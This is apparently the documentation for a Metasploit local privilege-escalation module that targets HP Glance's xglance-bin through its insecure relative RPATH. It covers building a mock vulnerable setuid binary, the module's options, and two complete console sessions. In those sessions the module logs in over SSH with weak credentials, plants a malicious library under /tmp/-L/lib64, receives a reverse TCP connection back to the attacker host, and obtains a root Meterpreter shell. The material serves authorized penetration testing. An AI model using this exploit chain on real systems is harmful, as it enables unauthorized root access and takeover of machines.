## Vulnerable Application


This exploit takes advantage of xglance-bin, part of
HP's Glance (or Performance Monitoring) version 11 'and subsequent',
which was compiled with an insecure RPATH option.  The RPATH includes
a relative path to -L/lib64/ which can be controlled by a user.
Creating libraries in this location will result in an
escalation of privileges to root.

### Mock Application

Unfortunately the application is a pay for application and the version is many years old by the time the
PoC was released.  Instead, we use a mock binary based on the permissions noted in the original CVE
announcement, and the `ldd` details from the PoC.

The following commands were performed on Fedora 31 to create the binary.
When the binary was pushed to rhel7.1 for testing, a 'of size' libXm.so.4 was required
so ```cp /lib64/libffi.so.6 ./-L/lib64/libXm.so.4``` was enough to make the binary
vulnerable.

    ```
    sudo su
    cd ~
    dnf install motif-devel
    
    cat > main.c << DONE
    #include <stdio.h>
    #include <Xm/Xm.h>
    
    void main(){
        printf("HP xglance-bin emulator %d\n",XmVERSION);
        char* x = XmCvtXmStringToCT(NULL);
        printf("%p",x);
    }
    
    DONE
    
    
    mkdir -p ./-L/lib64;
    cd ./-L/lib64;
    ```
The follow commands copies files to the path for building.
However, they may not be installed on a default rhel system.

    ```
    # libXm.so.3 may fail on newer systems like fedora 31
    cp /usr/lib64/libXm.so.3 .;
    cp /usr/lib64/libXm.so.4 libXm.so.3;
    cp /usr/lib64/libXp.so.6 .;
    cp /usr/lib64/libXt.so.6 .;
    cd ../..;
    ```
    gcc -lXm main.c -o xglance-bin -Wl,-rpath=-L/lib64:/usr/lib64:/usr/X11R6/lib64:/opt/perf/lib64;
    mkdir -p /opt/perf/bin/;
    cp xglance-bin /opt/perf/bin/;
    chown root:bin /opt/perf/bin/xglance-bin;
    chmod 4555 /opt/perf/bin/xglance-bin;
    ```

To confirm the file is vulnerable, run:
    ```
    [fedora@fedora31 ~]$ ldd /opt/perf/bin/xglance-bin | grep -- -L/lib64/
            libXt.so.6 => -L/lib64/libXt.so.6 (0x00007f727441b000)
            libXp.so.6 => -L/lib64/libXp.so.6 (0x00007f72742b2000)
    ```
We'll want to see one or more `libX*.so*` files with `-L/lib64/`.


## Verification Steps

  1. Install the application
  2. Start msfconsole
  3. Get a session
  4. Do: ```use exploit/linux/local/hp_xglance_priv_esc```
  5. Do: ```set session #```
  6. Do: ```run```
  7. You should get a root shell.
 
## Options

### COMPILE

If the .so exploit should be compiled on the system.  `gcc` is required.
More noisey, but more AV resilient. Default is `true`.

### GLANCE_PATH

Path to the `xglance-bin` executable.  Default is `/opt/perf/bin/xglance-bin`.

## Scenarios

### Mock binary on Fedora 31 with compile

    ```
    [*] Processing xglance.rb for ERB directives.
    resource (xglance.rb)> use auxiliary/scanner/ssh/ssh_login
    resource (xglance.rb)> set rhosts 2.2.2.2
    rhosts => 2.2.2.2
    resource (xglance.rb)> set username fedora
    username => fedora
    resource (xglance.rb)> set password fedora
    password => fedora
    resource (xglance.rb)> run
    [+] 2.2.2.2:22 - Success: 'fedora:fedora' ''
    [*] Command shell session 1 opened (1.1.1.1:34379 -> 2.2.2.2:22) at 2020-04-19 14:39:45 -0400
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
    ```
    ```
    resource (xglance.rb)> use exploit/linux/local/hp_xglance_priv_esc
    resource (xglance.rb)> set session -1
    session => -1
    resource (xglance.rb)> set verbose true
    verbose => true
    resource (xglance.rb)> rexploit
    [*] Reloading module...
    [!] SESSION may not be compatible with this module.
    [*] Started reverse TCP handler on 1.1.1.1:4444
    [+] xglance-bin found, and linked to vulnerable relative path -L/lib64/ through libXt.so.6
    [*] Deleting exploit folder: /tmp/-L
    [*] Creating exploit folder: /tmp/-L/lib64/
    [+] gcc is installed
    [*] Live compiling exploit on system...
    [*] Max line length is 65537
    [*] Writing 106298 bytes in 7 chunks of 61359 bytes (octal-encoded), using printf
    [*] Next chunk is 61584 bytes
    [*] Next chunk is 60411 bytes
    [*] Next chunk is 61525 bytes
    [*] Next chunk is 61438 bytes
    [*] Next chunk is 61757 bytes
    [*] Next chunk is 30375 bytes
    [*] uploading payload
    [*] Writing '/tmp/.u4aLoiq' (207 bytes) ...
    [*] Max line length is 65537
    [*] Writing 207 bytes in 1 chunks of 630 bytes (octal-encoded), using printf
    [*] Launching xglance-bin...
    [*] Transmitting intermediate stager...(106 bytes)
    [*] Sending stage (980808 bytes) to 2.2.2.2
    [*] Meterpreter session 2 opened (1.1.1.1:4444 -> 2.2.2.2:55298) at 2020-04-19 14:40:05 -0400
    
    meterpreter > getuid
    Server username: no-user @ fedora31 (uid=0, gid=1000, euid=0, egid=1000)
    meterpreter > shell
    Process 1699 created.
    Channel 1 created.
    whoami
    root
    ^Z
    Background channel 1? [y/N]  y
    meterpreter > sysinfo
    Computer     : 2.2.2.2
    OS           : Fedora 31 (Linux 5.3.7-301.fc31.x86_64)
    Architecture : x64
    BuildTuple   : i486-linux-musl
    Meterpreter  : x86/linux
    meterpreter > 
    ```

### Mock binary on rhel 7.1 no compile

    ```
    [*] Processing xglance.rb for ERB directives.
    resource (xglance.rb)> use auxiliary/scanner/ssh/ssh_login
    resource (xglance.rb)> set rhosts 2.2.2.2
    rhosts => 2.2.2.2
    resource (xglance.rb)> set username redhat
    username => redhat
    resource (xglance.rb)> set password redhat
    password => redhat
    resource (xglance.rb)> run
    [+] 2.2.2.2:22 - Success: 'redhat:redhat' ''
    [*] Command shell session 1 opened (1.1.1.1:45901 -> 2.2.2.2:22) at 2020-04-19 14:59:53 -0400
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
    ```
    ```
    msf5 exploit(linux/local/hp_xglance_priv_esc) > rexploit
    [*] Reloading module...

    [!] SESSION may not be compatible with this module.
    [*] Started reverse TCP handler on 1.1.1.1:4444 
    [+] xglance-bin found, and linked to vulnerable relative path -L/lib64/ through libXm.so.4
    [*] Deleting exploit folder: /tmp/-L
    [*] Creating exploit folder: /tmp/-L/lib64/
    [*] Dropping pre-compiled exploit on system...
    [*] Writing '/tmp/-L/lib64/libXm.so.3' (368248 bytes) ...
    [*] Max line length is 65537
    [*] Writing 368248 bytes in 23 chunks of 46385 bytes (octal-encoded), using printf
    [*] Next chunk is 53790 bytes
    [*] Next chunk is 38675 bytes
    [*] Next chunk is 38759 bytes
    [*] Next chunk is 38694 bytes
    [*] Next chunk is 38757 bytes
    [*] Next chunk is 38658 bytes
    [*] Next chunk is 63466 bytes
    [*] Next chunk is 62734 bytes
    [*] Next chunk is 63857 bytes
    [*] Next chunk is 63812 bytes
    [*] Next chunk is 46324 bytes
    [*] Next chunk is 35989 bytes
    [*] Next chunk is 38405 bytes
    [*] Next chunk is 38978 bytes
    [*] Next chunk is 38950 bytes
    [*] Next chunk is 38935 bytes
    [*] Next chunk is 40042 bytes
    [*] Next chunk is 63562 bytes
    [*] Next chunk is 63562 bytes
    [*] Next chunk is 63521 bytes
    [*] Next chunk is 63618 bytes
    [*] Next chunk is 28951 bytes
    [*] uploading payload
    [*] Writing '/tmp/.u4aLoiq' (207 bytes) ...
    [*] Max line length is 65537
    [*] Writing 207 bytes in 1 chunks of 630 bytes (octal-encoded), using printf
    [*] Launching xglance-bin...
    [*] Transmitting intermediate stager...(106 bytes)
    [*] Sending stage (980808 bytes) to 2.2.2.2
    [*] Meterpreter session 2 opened (1.1.1.1:4444 -> 2.2.2.2:33373) at 2020-04-19 15:09:55 -0400
    [+] Deleted /tmp/-L/lib64/libXm.so.3
    [+] Deleted /tmp/.u4aLoiq
    
    meterpreter > getuid
    Server username: no-user @ localhost.localdomain (uid=0, gid=1000, euid=0, egid=1000)
    meterpreter > sysinfo
    Computer     : localhost.localdomain
    OS           : Red Hat Enterprise Linux 7 (Linux 3.10.0-229.el7.x86_64)
    Architecture : x64
    BuildTuple   : i486-linux-musl
    Meterpreter  : x86/linux
    meterpreter >
    ```
